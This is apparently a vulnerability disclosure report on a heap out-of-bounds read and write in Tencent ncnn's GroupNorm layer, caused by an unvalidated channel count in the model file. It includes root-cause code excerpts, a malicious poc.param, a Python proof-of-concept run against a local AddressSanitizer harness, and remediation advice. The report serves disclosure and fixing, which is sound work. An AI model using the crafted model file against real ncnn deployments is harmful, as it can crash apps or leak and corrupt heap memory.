# ncnn-10-GroupNorm Channel Count Out-of-Bounds

> Public status: No public CVE found for the same issue; ncnn also has CVE-2026-50144/112073/112074 (different functions/fields).

## Submission Fields (per submit.txt)

- **Vendor**: Tencent
- **Product**: ncnn
- **Version or Commit**: b0f1deb6183d7b3b5cd70dd47c95bb6c91ee038e
- **Vulnerability Class**: Out-of-Bounds Read

## Vulnerability Submission Details

- **Product and Version**: Tencent ncnn
- **Vulnerability Name**: ncnn GroupNorm channel count out-of-bounds vulnerability
- **Product Usage**: GitHub Tencent/ncnn (a C++ framework widely used for mobile/embedded inference; 24.1k stars.)

![Attachment 1](F:/Share/CVE%E6%8F%90%E4%BA%A4%E6%A8%A1%E6%9D%BF/%E6%8F%90%E4%BA%A4%E5%8C%BA/ncnn/ncnn-GroupNorm-channel-out-of-bounds.assets/image1.png)

- **Exploitation Conditions**:    User interaction required
- **Description**: The channels parameter of ncnn GroupNorm comes from the .param file and is not validated against the actual channel count of the input blob. When channels is far larger than the real channel count, channel_range only performs pointer arithmetic, and groupnorm loops over the fake channels for reads and writes, causing a wide-range heap out-of-bounds access.
- **Details**: Source: the 1=channels (and 0=group) of GroupNorm in a malicious .param. Sink: src/layer/groupnorm.cpp:104-147 (channels_g = channels/group; channel_range(g*channels_g, channels_g); groupnorm(...channels_g...)); x86 kernel src/layer/x86/groupnorm_fp32.h:48. NCNN_VALIDATION only checks group>0 and channels%group==0, not the relation to the real blob.c; when affine=0 no weights are needed.
- **Reproduction Environment**: Ubuntu Linux 6.11.0-29, g++ 14, AddressSanitizer; ncnn commit b0f1deb6183d7b3b5cd70dd47c95bb6c91ee038e (2026-11-25). CMake builds an ASAN static library (NCNN_VULKAN=OFF, NCNN_OPENMP=OFF); a minimal Net loads the param and forwards.
- **Exploitation Details**: 1. Craft poc.param: Input is 8x8x4, GroupNorm with group=1 channels=1000000 affine=0.  
  2. Run python exp.py.  
  3. AddressSanitizer reports heap-buffer-overflow, READ of size 64, with the stack pointing to groupnorm_fp32.h:48 (GroupNorm_x86_avx512::forward_inplace), 0 bytes after a 1092-byte region, exit code -6.

## Detailed Vulnerability Analysis

### 1. Analysis Path

Starting from the GroupNorm parameter entry in `.param`, verify layer by layer along `load_param()` → `forward_inplace()` → the x86 kernel whether "the parameters match the input channel count", then validate with a minimal `Net` harness built with ASAN.

- Parameter parsing: `GroupNorm::load_param()` in `src/layer/groupnorm.cpp`.
- Generic forward: `src/layer/groupnorm.cpp:104-147`.
- x86 kernel: `src/layer/x86/groupnorm_fp32.h:48` (ASAN hit point).

### 2. Input and Validation Gaps

GroupNorm parameters: `0=group`, `1=channels`, `2=eps`, `3=affine`. With `NCNN_VALIDATION` enabled, only `group > 0` and `channels % group == 0` are checked; **`channels` is not validated against the input `bottom_blob.c`**; release builds usually do not define `NCNN_VALIDATION`, which means no validation at all. `channels` is therefore entirely determined by the model file.

### 3. Code Path and Root Cause

```cpp
const int channels_g = channels / group;          // attacker-controlled
Mat bottom_top_blob_g = bottom_top_blob.channel_range(g * channels_g, channels_g);
groupnorm(bottom_top_blob_g, gamma_ptr, beta_ptr, eps, channels_g, size, cstep);
```

`channel_range` only performs pointer arithmetic and does not check `g*channels_g + channels_g <= bottom.c`. The kernel `groupnorm()` loops with `channels_g` as the upper bound:

```cpp
for (int q = 0; q < channels; q++) {
    const float* ptr0 = ptr + cstep * q;   // q can far exceed the real channel count
    ... _mm512_loadu_ps(ptr0) ...          // groupnorm_fp32.h:48
}
```

With input `c=4` and `channels=1000000`, the kernel performs mean/variance reductions for every "fake channel", and the first access already runs past the input heap block. ASAN aborts at the first vectorized read; if execution continued, the same kernel would also write the normalized results back to these out-of-bounds channels, posing a further out-of-bounds write risk.

### 4. Trigger and Evidence

`poc.param`:

```text
7767517
2 2
Input in 0 1 data 0=8 1=8 2=4
GroupNorm gn 1 1 data out 0=1 1=1000000 3=0
```

Input `8x8x4`, `group=1`, `channels=1000000`, `affine=0`. ASAN reports `heap-buffer-overflow READ of size 64`, the stack points to `groupnorm_fp32.h:48`, the out-of-bounds address lies after the 1092-byte input allocation, and the exit code is `-6`.

### 5. Impact

A heap out-of-bounds read of controllable length; since `GroupNorm` is an in-place layer, full execution also writes normalized values back to the out-of-bounds channels, giving it heap out-of-bounds write potential. It can be used for information disclosure or crashes, and can further corrupt adjacent heap objects.

### 6. Fix Boundary

When `channels == 0`, `bottom_blob.c` should be used; when non-zero, validate `channels == bottom_blob.c` and ensure `group * channels_g <= bottom_blob.c`; add a bounds check before `channel_range`.

## PoC Details

Usage:
    python exp.py
Dependencies:
    Python 3.8+, standard library only
    A locally built ASAN ncnn harness (default /home/ddl/ai-audit/repro/ncnn/poc)
Notes:
    The script generates poc.param (Input 8x8x4 + GroupNorm channels=1000000) and calls the harness;

```
#!/usr/bin/env python3
# ncnn GroupNorm channels vs real blob channels OOB
import os, subprocess, sys, tempfile
HARNESS = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("NCNN_POC", "/home/ddl/ai-audit/repro/ncnn/poc")
PARAM = """7767517
2 2
Input in 0 1 data 0=8 1=8 2=4
GroupNorm gn 1 1 data out 0=1 1=1000000 3=0
"""
def main():
    if not os.path.isfile(HARNESS):
        print("[!] harness not found: %s" % HARNESS); return 2
    with tempfile.TemporaryDirectory() as td:
        open(os.path.join(td,"poc.param"),"w").write(PARAM)
        open(os.path.join(td,"poc.bin"),"wb").write(b"\0"*64)
        env = dict(os.environ, ASAN_OPTIONS="detect_leaks=0:abort_on_error=1")
        p = subprocess.run([HARNESS], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env, cwd=td)
    out = p.stdout
    print("[*] target: ncnn GroupNorm channels=1000000 on real blob c=4")
    print("[*] source: src/layer/groupnorm.cpp:104-147, x86/groupnorm_fp32.h:48")
    for line in out.splitlines():
        if any(k in line for k in ("ERROR: AddressSanitizer","READ of size","groupnorm_fp32.h:48","groupnorm_x86_avx512.cpp:106","SUMMARY: AddressSanitizer")):
            print(line)
    print("[*] exit_code=%d" % p.returncode)
    ok = ("heap-buffer-overflow" in out and "groupnorm_fp32.h:48" in out and p.returncode != 0)
    print("RESULT: ncnn GroupNorm channel-count OOB (groupnorm_fp32.h:48)" if ok else "RESULT: NOT REPRODUCED")
    return 0 if ok else 1
if __name__ == "__main__":
    sys.exit(main())
```

![Attachment 2](../../ncnn/markdown/assets/image2.png)

## Remediation

In GroupNorm::load_param/forward, validate that channels matches bottom_blob.c (take blob.c when channels==0); validate group*channels_g <= blob.c; add bounds checks to channel_range/row_range/range.
